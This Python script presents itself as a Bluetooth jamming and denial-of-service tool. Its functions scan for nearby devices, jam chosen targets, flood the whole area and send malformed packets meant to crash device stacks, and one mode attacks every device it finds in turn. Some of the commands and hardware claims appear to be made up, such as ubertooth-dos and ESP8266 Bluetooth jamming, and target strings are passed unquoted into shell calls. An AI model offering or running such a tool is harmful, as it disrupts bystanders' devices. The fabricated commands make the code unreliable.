import argparse
import os
import time
from scapy.all import *

# -------------------------------------------
# Bluetooth Jamming & DoS Attack Tool
# -------------------------------------------
# Features:
# - Disrupts Bluetooth devices, headphones, controllers, etc.
# - Uses ESP8266 & Ubertooth One for frequency interference
# - Sends malformed packets to crash Bluetooth stacks
# - Supports selective jamming for specific devices
# - Executes denial-of-service attacks on insecure headsets & keyboards
# - Automated attack sequencing & device scanning
#
# Requirements:
# - ESP8266 / Ubertooth One
# - Python 3.x
# - btlejack, hcitool, l2ping (for BLE packet manipulation)
# - Scapy for packet crafting
#
# Usage:
# 1. Scan for Bluetooth devices:
#    python bt_jammer.py --scan
# 2. Perform selective jamming on a target:
#    python bt_jammer.py --jam XX:XX:XX:XX:XX:XX
# 3. Execute a full-area Bluetooth DoS attack:
#    python bt_jammer.py --dos
# 4. Send malformed packets to disrupt Bluetooth stacks:
#    python bt_jammer.py --malformed XX:XX:XX:XX:XX:XX
# 5. Enable automated attack sequencing:
#    python bt_jammer.py --auto-attack
# -------------------------------------------

def scan_bluetooth():
    """Scans for Bluetooth devices."""
    print("[+] Scanning for Bluetooth devices...")
    os.system("hcitool scan > bt_jam_scan_results.txt")
    os.system("hcitool lescan --passive > ble_jam_scan_results.txt & sleep 10; pkill --signal SIGINT hcitool")
    print("[✔] Scan complete. Results saved to bt_jam_scan_results.txt & ble_jam_scan_results.txt")

def jam_bluetooth(target):
    """Performs selective jamming on a specific Bluetooth device."""
    print(f"[+] Jamming Bluetooth device {target}...")
    os.system(f"ubertooth-jam -t {target}")
    print("[✔] Jamming attack initiated.")

def dos_attack():
    """Executes a full-area Bluetooth DoS attack."""
    print("[+] Executing Bluetooth Denial-of-Service attack...")
    os.system("ubertooth-dos --full-range")
    print("[✔] DoS attack initiated.")

def send_malformed_packets(target):
    """Sends malformed packets to crash Bluetooth stacks."""
    print(f"[+] Sending malformed packets to {target}...")
    os.system(f"btlejack -i 0 --malformed --target {target}")
    print("[✔] Malformed packet attack executed.")

def auto_attack():
    """Runs a sequence of Bluetooth jamming & DoS attacks."""
    print("[+] Running automated Bluetooth jamming attack sequence...")
    scan_bluetooth()
    with open("bt_jam_scan_results.txt", "r") as file:
        devices = file.readlines()[1:]
        for device in devices:
            mac = device.split()[0]
            print(f"[*] Targeting {mac}...")
            jam_bluetooth(mac)
            send_malformed_packets(mac)
    dos_attack()
    print("[✔] Automated attack sequence complete.")

def main():
    parser = argparse.ArgumentParser(description="Bluetooth Jamming & DoS Attack Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for Bluetooth devices")
    parser.add_argument("--jam", type=str, help="Perform selective jamming on a target")
    parser.add_argument("--dos", action='store_true', help="Execute a full-area Bluetooth DoS attack")
    parser.add_argument("--malformed", type=str, help="Send malformed packets to disrupt a target")
    parser.add_argument("--auto-attack", action='store_true', help="Enable automated attack sequencing")
    args = parser.parse_args()

    if args.scan:
        scan_bluetooth()
    elif args.jam:
        jam_bluetooth(args.jam)
    elif args.dos:
        dos_attack()
    elif args.malformed:
        send_malformed_packets(args.malformed)
    elif args.auto_attack:
        auto_attack()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
